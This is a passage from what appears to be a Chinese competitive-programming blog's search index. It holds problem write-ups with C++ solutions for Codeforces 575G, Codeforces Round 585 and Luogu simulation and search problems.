max(val[s], now); } } memset(dp[i], 0, sizeof dp[i]); for (int s = 0; s &lt; (1 &lt;&lt; n); s++) { for (int k = s; ; k = (k - 1) &amp; s) { dp[i][s] = max(dp[i][s], dp[i - 1][k] + val[s ^ k]); // clog &lt;&lt; dp[i][s] &lt;&lt; ' '; if (k == 0) break; // 至少执行一次 } } // clog &lt;&lt; endl; } cout &lt;&lt; dp[min(n, m)][(1 &lt;&lt; n) - 1] &lt;&lt; endl; }}","tags":["题解","oi","dp"],"categories":["OI"]},{"title":"CF575G Run for beer","path":"/2019/10/3/Codeforces-575G/","content":"http://codeforces.com/problemset/problem/575/Ghttp://codeforces.com/problemset/problem/575/G 9月30日的 Codeforces Div.2 的题解大概就鸽了吧 题意 个点条边的带权图, 求到的最小权值且最小长度的路径, 权值为把路径经过的边的权从终点到起点往依次写下组成的十进制数, . 思路 先把到终点距离为的点预处理出来, 然后从多起点开始跑字典序最小最短路(分层BFS). 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;typedef long long int64;const int MAXN = 100010;const int INF = 0x3f3f3f3f;#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}template &lt;typename T&gt;inline void write(T x) { if (x &lt; 0) putchar('-'), x = -x; if (x &gt; 9) write(x / 10); putchar(x % 10 + '0');}class lfs { public: lfs(int N) { memset(head, -1, sizeof head); ecnt = 0; n = N; } void adde(int from, int to, int w) { e[ecnt].to = to; e[ecnt].w = w; e[ecnt].next = head[from]; head[from] = ecnt++; } void addde(int a, int b, int w) { adde(a, b, w); adde(b, a, w); } void solve() { vector&lt;int&gt; bfs_order; memset(dis, INF, sizeof dis); dis[0] = 0; bfs_order.push_back(0); int cur = 0; // bfs队列不用pop, 空间换时间 while (cur &lt; bfs_order.size()) { int u = bfs_order[cur]; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (dis[v] == INF) { dis[v] = dis[u] + 1; bfs_order.push_back(v); } } cur++; } vector&lt;int&gt; end_point; end_point.push_back(n - 1); memset(vis, false, sizeof vis); memset(pre, 0, sizeof pre); vis[n - 1] = true; cur = 0; int mindis = dis[n - 1]; while (cur &lt; end_point.size()) { int u = end_point[cur]; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (e[i].w == 0 &amp;&amp; !vis[v]) { end_point.push_back(v); pre[v] = u; // 实际顺序是反的 vis[v] = true; mindis = min(mindis, dis[v]); } } cur++; } bool leading_zeros = true; // 当前bfs是否还在前导零中 for (int l = mindis; l &gt; 0; l--) { int now = INF; vector&lt;int&gt; next_point; for (auto&amp; u : end_point) { for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (dis[v] + 1 == l) { now = min(now, e[i].w); } } } if (now != 0) leading_zeros = false; if (l == 1 || !leading_zeros) cout &lt;&lt; now; for (auto&amp; u : end_point) { for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (dis[v] + 1 == l &amp;&amp; e[i].w == now &amp;&amp; !vis[v]) { vis[v] = true; next_point.push_back(v); pre[v] = u; } } } end_point = next_point; } if (leading_zeros) cout &lt;&lt; 0; // 都是0的情况 cout &lt;&lt; endl; vector&lt;int&gt; path; int u = 0; path.push_back(u); while (u != n - 1) { u = pre[u]; path.push_back(u); } cout &lt;&lt; path.size() &lt;&lt; endl; for (auto&amp; i : path) { cout &lt;&lt; i &lt;&lt; ' '; } cout &lt;&lt; endl; } protected: struct Edge { int to, next, w; } e[MAXN * 2]; int head[MAXN]; int ecnt; int n; int dis[MAXN]; bool vis[MAXN]; int pre[MAXN];};int main() { int n = read(); int m = read(); auto graph = new lfs(n); for (int i = 1; i &lt;= m; i++) { int u = read(); int v = read(); int w = read(); graph-&gt;addde(u, v, w); } graph-&gt;solve();}","tags":["题解","oi","图论"],"categories":["OI"]},{"title":"Codeforces Round 585 (Div. 2)","path":"/2019/9/16/Codeforces-1215/","content":"https://codeforces.com/contest/1215https://codeforces.com/contest/1215 一场罕见的国人时间的cf比赛，在学校机房的许多巨佬的带领下总算上蓝了，真是妙不可言。 A. Yellow Cards 最少罚下场：尽量把每个人都罚到只剩一张牌就下场 最多罚下场：先全部罚k值小的一队，再罚大的一对。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;const int INF = 0x3f3f3f3f;int main() {\tint a1, a2, k1, k2, n;\tcin &gt;&gt; a1 &gt;&gt; a2 &gt;&gt; k1 &gt;&gt; k2 &gt;&gt; n;\tif (k1 &gt; k2) { swap(k1, k2); swap(a1, a2);\t}\tint mn, mx;\tif (n &lt;= a1 * (k1 - 1) + a2 * (k2 - 1)) { mn = 0;\t} else { mn = n - (a1 * (k1 - 1) + a2 * (k2 - 1));\t}\tif (n &lt;= a1 * k1) { mx = n / k1;\t} else { mx = a1 + (n - a1 * k1) / k2;\t}\tcout &lt;&lt; mn &lt;&lt; ' ' &lt;&lt; mx &lt;&lt; endl;} B. The Number of Products 从左到右扫一遍，记录遇到的正数负数的数量，代码中cntn和cntp表示从之前的位置到现在有几个位置开始乘到现在的数是正（负），遇到负数就交换这两个值（想一想为什么）。记得全程int64，身边好多人没开完被叉掉了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;typedef long long int64;const int MAXN = 2e5 + 10;const int INF = 0x3f3f3f3f;int a[MAXN];#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}int main() {\tint n = read();\tfor (int i = 1; i &lt;= n; i++) { int x = read(); a[i] = (x &gt; 0) ? 1 : -1;\t}\tint64 cntn = 0, cntp = 0;\tint64 ansn = 0, ansp = 0;\tint64 totn = 0, totp = 0;\tfor (int i = 1; i &lt;= n; i++) { if (a[i] &lt; 0) { ansn += cntp; ansp += cntn; swap(cntn, cntp); cntn++; totn++; } else { ansn += cntn; ansp += cntp; cntp++; totp++; }\t}\tcout &lt;&lt; ansn + totn &lt;&lt; ' ' &lt;&lt; ansp + totp &lt;&lt; endl;} C. Swap Letters 首先，本来相等的位置不用管，考虑以下两种不相等的情况 123A: ...a...b... ...b...b... ...b...a... | ==&gt; / ==&gt;B: ...b...a... ...a...a... ...b...a... 因此，方向相同的一对可以一步解决，方向相反的要先一步变成相同的。那么贪就是了，'a'的数量为奇数时无解。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;using namespace std;const int MAXN = 2e5 + 10;const int INF = 0x3f3f3f3f;char a[MAXN], b[MAXN];int main() {\tint n;\tcin &gt;&gt; n &gt;&gt; (a + 1) &gt;&gt; (b + 1);\tint cnta = 0;\tfor (int i = 1; i &lt;= n; i++) { if (a[i] == 'a') cnta++; if (b[i] == 'a') cnta++;\t}\tif (cnta % 2 == 1) { cout &lt;&lt; -1 &lt;&lt; endl; return 0;\t}\tvector&lt;int&gt; aabb, abba;\tfor (int i = 1; i &lt;= n; i++) { if (a[i] == 'a' &amp;&amp; b[i] == 'b') { aabb.push_back(i); } else if (a[i] == 'b' &amp;&amp; b[i] == 'a') { abba.push_back(i); }\t}\tvector&lt;pair&lt;int, int&gt;&gt; ans;\tfor (int i = 0; i &lt; aabb.size(); i += 2) { if (i + 1 == aabb.size()) break; ans.push_back(make_pair(aabb[i], aabb[i + 1]));\t}\tfor (int i = 0; i &lt; abba.size(); i += 2) { if (i + 1 == abba.size()) break; ans.push_back(make_pair(abba[i], abba[i + 1]));\t}\tif (aabb.size() % 2 == 1 &amp;&amp; abba.size() % 2 == 1) { ans.push_back(make_pair(aabb[aabb.size() - 1], aabb[aabb.size() - 1])); ans.push_back(make_pair(aabb[aabb.size() - 1], abba[abba.size() - 1]));\t}\tcout &lt;&lt; ans.size() &lt;&lt; endl;\tfor (int i = 0; i &lt; ans.size(); i++) { cout &lt;&lt; ans[i].first &lt;&lt; ' ' &lt;&lt; ans[i].second &lt;&lt; endl;\t}} 再次吐槽辣鸡 dev-cpp，我没有#include &lt;vector&gt;你还能编译?! D. Ticket Game 简单博弈论，两边问号和相等的值可以约掉（希望不相等的人先走，另一个人复读机就行），剩下的当且仅当数和问号在异侧且两个问号对应一个9时相等的人胜。 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;const int INF = 0x3f3f3f3f;const int MAXN = 2e5 + 10;char s[MAXN];int main() {\tint n;\tcin &gt;&gt; n &gt;&gt; s;\tint q = 0, sum = 0;\tfor (int i = 0; i &lt; n / 2; i++) { if (s[i] == '?') q++; else sum += s[i] - '0';\t}\tfor (int i = n / 2; i &lt; n; i++) { if (s[i] == '?') q--; else sum -= s[i] - '0';\t}\tif (q * 9 == -sum * 2) { cout &lt;&lt; \"Bicarp\" &lt;&lt; endl;\t} else { cout &lt;&lt; \"Monocarp\" &lt;&lt; endl;\t}} E. Marbles 没有 @ywh666 巨佬提醒我真想不到这东西是个TSP 看到其实就可以想到是个状压。经过几次模拟可以发现，把和互相分离的成本是和移动顺序无关的，所以可以抽象成一个TSP，要把20种颜色全部分开，就是要遍历20个点。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;using namespace std;typedef long long int64;const int MAXN = 4e5 + 10;const int MAXA = 25;const int INF = 0x3f3f3f3f;int a[MAXN];int64 dis[MAXA][MAXA];int64 dp[(1 &lt;&lt; 20) + 10], now[MAXA];int64 tsp() {\tmemset(dp, INF, sizeof dp);\tdp[0] = 0;\tfor (int i = 0; i &lt; (1 &lt;&lt; 20); i++) { memset(now, 0, sizeof now); for (int j = 1; j &lt;= 20; j++) { if (i &amp; (1 &lt;&lt; (j - 1))) { for (int k = 1; k &lt;= 20; k++) { now[k] += dis[j][k]; } } } for (int j = 1; j &lt;= 20; j++) { if (i &amp; (1 &lt;&lt; (j - 1))) continue; dp[i | (1 &lt;&lt; (j - 1))] = min(dp[i | (1 &lt;&lt; (j - 1))], dp[i] + now[j]); }\t}\treturn dp[(1 &lt;&lt; 20) - 1];}int main() {\tint n;\tcin &gt;&gt; n;\tfor (int i = 1; i &lt;= n; i++) { cin &gt;&gt; a[i];\t}\tfor (int i = 1; i &lt;= 20; i++) { for (int j = 1; j &lt;= 20; j++) { if (i == j) continue; int cnt = 0; for (int k = n; k &gt;= 1; k--) { if (a[k] == i) cnt++; else if (a[k] == j) dis[i][j] += cnt; } }\t}\tcout &lt;&lt; tsp() &lt;&lt; endl;} F题题面太长，看都不想看，结果我那个房就我一个活人，毫无 hack 体验。。。","tags":["题解","oi"],"categories":["OI"]},{"title":"洛谷P2482 [SDOI2010]猪国杀","path":"/2019/8/28/Luogu-P2418/","content":"https://www.luogu.org/problem/P2418https://www.luogu.org/problem/P2418 感到颓废怎么办？ 当然是写大模拟了。 你一看这道题的题面长度，就知道坑点一定很多。建议大家先自己按自己理解写完再看题解（Orz某一遍AC的大佬）。 有关于身份的判断：事实上只要有人主动打出杀，决斗和无懈可击，就可以直接确定他的身份了，所以我们不需要真的模拟每个人对别人的看法，只需要把每个人是否暴露身份这一状态存起来，由他自己在行动的时候维护就行。 坑点： 死人要从场上清掉，维护next指针。 只能杀下家，不能杀上家。 牌堆的牌摸完后，再摸牌始终摸出最后的一张（题面好像没说，但洛谷的数据是这么造的，有两个点需要这么处理） AOE时，优先出无懈可击，然后是杀和闪。 有可能对自己用无懈可击。 无懈可击分两种，一种是献殷勤：挡格斗和AOE，一种是表敌意：抵消别人的无懈可击。 调不出来，多打log 枚举类型能有效地提升代码可读性 多复用代码，比如说南蛮入侵和万箭齐发就可以写进一个函数 STL容器用户请注意：迭代中对容器的擦除有可能导致UB。（但是我用了STL，代码可读性就是比用数组的好，我用list维护手牌时间复杂度也比数组强（然并卵）） 每出掉一张牌，要从头开始检查可能出的下一张牌（比如装了诸葛连弩，之前的杀都可以用了），所以迭代器非法化的情况也不存在了，反正都要break。 代码 我自认为风格（特别是针对这种大模拟题）要比不少变量名不超过4个字符的人优秀。有了VSCode的IntelliSense，打着也不费事。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405// luogu-judger-enable-o2#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;list&gt;#include &lt;queue&gt;#include &lt;vector&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 12;const int MAXM = 1010;const int PLAYER_MAX_HP = 4;enum card_type : char { // no_card = '\\0', peach = 'P', // 桃 kill = 'K', // 杀 dodge = 'D', // 闪 fight = 'F', // 决斗 south_attack = 'N', // 南蛮入侵 arrow_attack = 'W', // 万箭齐发 watertight = 'J', // 无懈可击 crossbow = 'Z' // 诸葛连弩};string card_name(card_type card) { switch (card) { case peach: return \"桃\"; case kill: return \"杀\"; case dodge: return \"闪\"; case fight: return \"决斗\"; case south_attack: return \"南蛮入侵\"; case arrow_attack: return \"万箭齐发\"; case watertight: return \"无懈可击\"; case crossbow: return \"诸葛连弩\"; }}enum player_type { king, minister, rebel };queue&lt;card_type&gt; card_heap; // 牌堆class player;int n;player* p[MAXN];#ifndef DEBUG#define clog \\ if (false) clog#endifvoid end_game(string winner);class player { protected: void take_card() { if (card_heap.empty()) { cerr &lt;&lt; \"错误! 牌堆被摸完了.\" &lt;&lt; endl; exit(EXIT_FAILURE); } clog &lt;&lt; id &lt;&lt; \"摸了一张\" &lt;&lt; card_name(card_heap.front()) &lt;&lt; endl; hand_card.push_back(card_heap.front()); // 据说牌堆摸完后，一直取最后一张牌 if (card_heap.size() &gt; 1) card_heap.pop(); } void show_identity() { clog &lt;&lt; id &lt;&lt; \"暴露了身份, 他的身份是\" &lt;&lt; role &lt;&lt; endl; if (role == rebel) { possible_role = enemy; } else if (role == minister) { possible_role = loyal; } } // 是否向目标表敌意 bool should_attack(player* target) { switch (role) { case king: return (target-&gt;possible_role == enemy || target-&gt;possible_role == pseudo_enemy); case minister: return (target-&gt;possible_role == enemy); case rebel: return (target-&gt;role == king || target-&gt;possible_role == loyal); } return false; } // 是否向目标献殷勤 bool should_protect(player* target) { switch (role) { case king: case minister: return (target-&gt;role == king || target-&gt;possible_role == loyal); case rebel: return (target-&gt;possible_role == enemy); } return false; } // 返回是否成功被无懈可击抵消, is_friendship: // 使用这次无懈可击是对target献殷勤还是表敌意 bool ask_around_for_watertight(player* target, bool is_friendship) { bool first = true; for (player* cur = this; first || cur != this; cur = cur-&gt;next, first = false) { if (is_friendship ? (cur-&gt;should_protect(target)) : (cur-&gt;should_attack(target))) { if (cur-&gt;try_use_card(watertight)) { clog &lt;&lt; cur-&gt;id &lt;&lt; \"使用了无懈可击抵消了\" &lt;&lt; id &lt;&lt; \"的锦囊, 向\" &lt;&lt; target-&gt;id &lt;&lt; (is_friendship ? \"献殷勤\" : \"表敌意\") &lt;&lt; endl; // 只要用了无懈可击就暴露身份了 cur-&gt;show_identity(); return (!cur-&gt;ask_around_for_watertight(cur, false)); } } } return false; } // 返回所有对象中当前应该表敌意的对象 player* find_enemy() { if (role == rebel) return p[1]; for (player* cur = next; cur != this; cur = cur-&gt;next) { if (should_attack(cur)) return cur; } return nullptr; } // 返回应该出杀的对象 player* find_kill_target() { if (role == rebel) { // 在主公旁边 if (next == p[1]) return p[1]; } if (should_attack(next)) return next; return nullptr; } bool try_kill(list&lt;card_type&gt;::iterator&amp; card) { player* target = find_kill_target(); if (target == nullptr) return false; card = hand_card.erase(card); clog &lt;&lt; id &lt;&lt; \"向\" &lt;&lt; target-&gt;id &lt;&lt; \"使用了杀\" &lt;&lt; endl; // 尝试使用杀，已经是跳忠或跳反的行为 show_identity(); if (!target-&gt;try_use_card(dodge)) target-&gt;hurt(this); return true; } bool try_fight(list&lt;card_type&gt;::iterator&amp; card) { player* target = find_enemy(); if (target == nullptr) return false; card = hand_card.erase(card); clog &lt;&lt; id &lt;&lt; \"向\" &lt;&lt; target-&gt;id &lt;&lt; \"使用了决斗\" &lt;&lt; endl; // 尝试使用决斗，已经是跳忠或跳反的行为 show_identity(); if (!ask_around_for_watertight(target, true)) { // 忠臣不会对主公出杀 if (role == king &amp;&amp; target-&gt;role == minister) { target-&gt;hurt(this); return true; } while (true) { if (!target-&gt;try_use_card(kill)) { target-&gt;hurt(this); return true; } if (!try_use_card(kill)) { hurt(target); return true; } } } return true; } // 尝试出牌，返回是否成功 bool try_use_card(card_type card) { for (auto i = hand_card.begin(); i != hand_card.end(); i++) { if (*i == card) { clog &lt;&lt; id &lt;&lt; \"出了\" &lt;&lt; card_name(card) &lt;&lt; endl; hand_card.erase(i); return true; } } return false; } void use_aoe(card_type response) { for (player* cur = next; cur != this; cur = cur-&gt;next) { if (!ask_around_for_watertight(cur, true)) { if (!cur-&gt;try_use_card(response)) { cur-&gt;hurt(this); if (cur-&gt;role == king &amp;&amp; possible_role == unknown) { clog &lt;&lt; \"主公将\" &lt;&lt; id &lt;&lt; \"视作了类反贼\" &lt;&lt; endl; possible_role = pseudo_enemy; } } } } } // 挨血一点 void hurt(player* source) { hp--; clog &lt;&lt; id &lt;&lt; \"受到一点伤害, 当前HP: \" &lt;&lt; hp &lt;&lt; endl; if (hp == 0) { if (try_use_card(peach)) { hp = 1; return; } else { clog &lt;&lt; id &lt;&lt; \"死亡\" &lt;&lt; endl; // 玩家死亡 // 判断是否达成游戏条件 if (role == king) end_game(\"FP\"); else { bool remain_rebel = false; for (int i = 1; i &lt;= n; i++) { if (p[i]-&gt;role == rebel &amp;&amp; p[i]-&gt;hp &gt; 0) { remain_rebel = true; break; } } if (!remain_rebel) end_game(\"MP\"); } prev-&gt;next = next; next-&gt;prev = prev; if (role == rebel) { clog &lt;&lt; \"反贼被杀, \" &lt;&lt; source-&gt;id &lt;&lt; \"摸三张牌\" &lt;&lt; endl; source-&gt;take_card(); source-&gt;take_card(); source-&gt;take_card(); } else if (role == minister &amp;&amp; source-&gt;role == king) { clog &lt;&lt; \"主公杀死了忠臣, 弃置所有手牌和装备\" &lt;&lt; endl; source-&gt;hand_card.clear(); source-&gt;equipment = (card_type)'\\0'; } } } } public: int hp = PLAYER_MAX_HP; int id; list&lt;card_type&gt; hand_card; // 手牌 player_type role; card_type equipment = (card_type)'\\0'; player* next = nullptr; player* prev = nullptr; enum possible_role_type { unknown, loyal, enemy, pseudo_enemy } possible_role = unknown; player(int ID, player_type r) : id(ID), role(r) {} void run_round() { clog &lt;&lt; \"开始\" &lt;&lt; id &lt;&lt; \"的回合, 当前HP: \" &lt;&lt; hp &lt;&lt; \", 身份: \" &lt;&lt; role &lt;&lt; endl; // 摸两张牌 take_card(); take_card(); clog &lt;&lt; id &lt;&lt; \"当前手牌: \"; for (auto i : hand_card) { clog &lt;&lt; card_name(i) &lt;&lt; ' '; } clog &lt;&lt; endl; bool kill_used = false, card_used = false; do { card_used = false; for (auto i = hand_card.begin(); i != hand_card.end(); i++) { switch (*i) { case peach: if (hp &lt; PLAYER_MAX_HP) { i = hand_card.erase(i); card_used = true; hp++; clog &lt;&lt; id &lt;&lt; \"使用了桃, 回血到\" &lt;&lt; hp &lt;&lt; endl; } break; case kill: if (kill_used &amp;&amp; equipment != crossbow) break; card_used = kill_used = try_kill(i); break; case fight: card_used = try_fight(i); break; case south_attack: clog &lt;&lt; id &lt;&lt; \"使用了南蛮入侵\" &lt;&lt; endl; i = hand_card.erase(i); use_aoe(kill); card_used = true; break; case arrow_attack: clog &lt;&lt; id &lt;&lt; \"使用了万箭齐发\" &lt;&lt; endl; i = hand_card.erase(i); use_aoe(dodge); card_used = true; break; case crossbow: clog &lt;&lt; id &lt;&lt; \"装备了诸葛连弩\" &lt;&lt; endl; i = hand_card.erase(i); equipment = crossbow; card_used = true; break; default: card_used = false; break; } // 考虑手牌被弃置的情况 if (card_used) break; } } while (card_used &amp;&amp; hp &gt; 0); clog &lt;&lt; \"结束\" &lt;&lt; id &lt;&lt; \"号玩家的回合\" &lt;&lt; endl &lt;&lt; endl; }};void end_game(string winner) { cout &lt;&lt; winner &lt;&lt; endl; for (int i = 1; i &lt;= n; i++) { if (p[i]-&gt;hp == 0) { cout &lt;&lt; \"DEAD\" &lt;&lt; endl; } else { int cnt = 0; for (auto j : p[i]-&gt;hand_card) { cout &lt;&lt; (char)j &lt;&lt; (++cnt == p[i]-&gt;hand_card.size() ? ' ' : ' '); } if (p[i]-&gt;hand_card.size() == 0) cout &lt;&lt; endl; // cout &lt;&lt; endl; } } exit(EXIT_SUCCESS);}int main() { int m; cin &gt;&gt; n &gt;&gt; m; for (int i = 1; i &lt;= n; i++) { string s; cin &gt;&gt; s; player_type role = (s == \"MP\") ? king : ((s == \"ZP\") ? minister : rebel); p[i] = new player(i, role); for (int j = 1; j &lt;= 4; j++) { char ch; do { ch = getchar(); } while (!isupper(ch)); p[i]-&gt;hand_card.push_back((card_type)ch); } } for (int i = 1; i &lt;= n; i++) { p[i]-&gt;next = p[(i == n) ? 1 : i + 1]; p[i]-&gt;prev = p[(i == 1) ? n : i - 1]; } for (int i = 1; i &lt;= m; i++) { char ch; do { ch = getchar(); } while (!isupper(ch)); card_heap.push((card_type)ch); } while (true) { for (int i = 1; i &lt;= n; i++) { if (p[i]-&gt;hp &gt; 0) { p[i]-&gt;run_round(); } } } return 0;}","tags":["题解","oi","模拟"],"categories":["OI"]},{"title":"洛谷P2540 斗地主增强版","path":"/2019/8/23/Luogu-P2540/","content":"https://www.luogu.org/problem/P2540https://www.luogu.org/problem/P2540 一道经典的搜索?题, 早就想做了. 听说考试原题的数据很水, 瞎贪心都能过, 就不说了, 这里分析一下几个直接贪心不能解决的地方. 两个鬼是否拆开(3333鬼鬼) 顺子要截取多少(日常斗地主经验太常见这种情况了) 炸弹和三联拆不拆开(33334444, 理解成四带两对可以一次走掉) 多次顺子/拆炸弹 按照以上几个痛点依次dfs搜索就是了, 具体见代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;map&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 25;typedef int card;const card three = 1;const card four = 2;const card five = 3;const card six = 4;const card seven = 5;const card eight = 6;const card nine = 7;const card ten = 8;const card J = 9;const card Q = 10;const card K = 11;const card A = 12;const card two = 13;const card grey_joker = 14;const card red_joker = 15;card parse(int a, int b) { switch (a) { case 0: if (b == 1) return grey_joker; else return red_joker; case 1: return A; case 2: return two; case 3: return three; case 4: return four; case 5: return five; case 6: return six; case 7: return seven; case 8: return eight; case 9: return nine; case 10: return ten; case 11: return J; case 12: return Q; case 13: return K; default: clog &lt;&lt; \"fuck unknown card\" &lt;&lt; endl; return 0; }}int n;int card_count[20];int style_count[5];// 考虑最后的情况(贪心匹配)int get_other() { int tmp[5]; memcpy(tmp, style_count, sizeof tmp); int ans = 0; while (tmp[4] &gt; 0) { tmp[4]--; ans++; if (tmp[1] &gt;= 2) { // 带两张单牌 tmp[1] -= 2; } else if (tmp[2] &gt;= 2) { // 带两对 tmp[2] -= 2; } else if (tmp[2] &gt;= 1) { // 带一对 tmp[2]--; } } while (tmp[3] &gt; 0) { tmp[3]--; ans++; if (tmp[1] &gt;= 1) { // 带一张单牌 tmp[1]--; } else if (tmp[2] &gt;= 1) { // 带一对 tmp[2]--; } } ans += tmp[2] + tmp[1]; return ans;}// 考虑拆开对子和三连, 炸弹int dfs_break() { int ans = INF; // 不拆 ans = min(ans, get_other()); // 拆对子 (没意义) // if (style_count[2] &gt; 0) { // style_count[2]--; // style_count[1] += 2; // ans = min(ans, get_other()); // style_count[1] -= 2; // style_count[2]++; // } // 拆三联 if (style_count[3] &gt; 0) { style_count[3]--; style_count[2]++; style_count[1]++; ans = min(ans, dfs_break()); style_count[1]--; style_count[2]--; style_count[3]++; } // 拆炸弹 if (style_count[4] &gt; 0) { style_count[4]--; style_count[2] += 2; ans = min(ans, dfs_break()); style_count[2] -= 2; style_count[1]++; style_count[3]++; ans = min(ans, dfs_break()); style_count[3]--; style_count[1]--; style_count[4]++; } return ans;}// 考虑三种顺子int dfs_sequence() { int ans = INF; // 不出顺子 memset(style_count, 0, sizeof style_count); for (card i = three; i &lt;= red_joker; i++) { style_count[card_count[i]]++; } ans = min(ans, dfs_break()); // 考虑单顺子 for (card i = three; i + 4 &lt; two; i++) { for (card j = i; j &lt; two; j++) { if (card_count[j] &lt; 1) break; if (j - i &lt; 4) continue; for (card k = i; k &lt;= j; k++) { card_count[k] -= 1; } ans = min(ans, dfs_sequence() + 1); for (card k = i; k &lt;= j; k++) { card_count[k] += 1; } } } // 考虑双顺子 for (card i = three; i + 2 &lt; two; i++) { for (card j = i; j &lt; two; j++) { if (card_count[j] &lt; 2) break; if (j - i &lt; 2) continue; for (card k = i; k &lt;= j; k++) { card_count[k] -= 2; } ans = min(ans, dfs_sequence() + 1); for (card k = i; k &lt;= j; k++) { card_count[k] += 2; } } } // 考虑三顺子 for (card i = three; i + 1 &lt; two; i++) { for (card j = i; j &lt; two; j++) { if (card_count[j] &lt; 3) break; if (j - i &lt; 1) continue; for (card k = i; k &lt;= j; k++) { card_count[k] -= 3; } ans = min(ans, dfs_sequence() + 1); for (card k = i; k &lt;= j; k++) { card_count[k] += 3; } } } return ans;}// 是否出对鬼int dfs_joker() { int ans = INF; if (card_count[grey_joker] &gt; 0 &amp;&amp; card_count[red_joker] &gt; 0) { card_count[grey_joker]--; card_count[red_joker]--; ans = min(ans, dfs_sequence() + 1); card_count[grey_joker]++; card_count[red_joker]++; } ans = min(ans, dfs_sequence()); return ans;}int main() { int tcnt; cin &gt;&gt; tcnt &gt;&gt; n; for (int T = 1; T &lt;= tcnt; T++) { memset(card_count, 0, sizeof card_count); for (int i = 1; i &lt;= n; i++) { int a, b; cin &gt;&gt; a &gt;&gt; b; card_count[parse(a, b)]++; } cout &lt;&lt; dfs_joker() &lt;&lt; endl; } // ans = INF; return 0;} 这题要是放cf educational round上会不会全场fst…","tags":["题解","oi","搜索"],"categories":["OI"]},{"title":"洛谷P2149 [SDOI2009]Elaxia的路线","path":"/2019/8/19/Luogu-P2149/","content":"https://www.luogu.org/problem/P2149https://www.luogu.org/problem/P2149 @liao_rl今天下午神秘兮兮的宣称洛谷上有道题4个标4种做法都被hack了, 于是我就看见了这个题. 好像也没有什么难的吧, 几乎一遍就A了原题和hack数据(交的前两遍数组没开够) 做法比较显然吧, 4次最短路得到的最短路径上的所有边, 然后分别按照相同和相反方向建两个DAG跑最长路就完了, 没什么坑啊. 也可能是我太弱了, 过于自信, 欢迎hack. 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;vector&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 1510;#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w 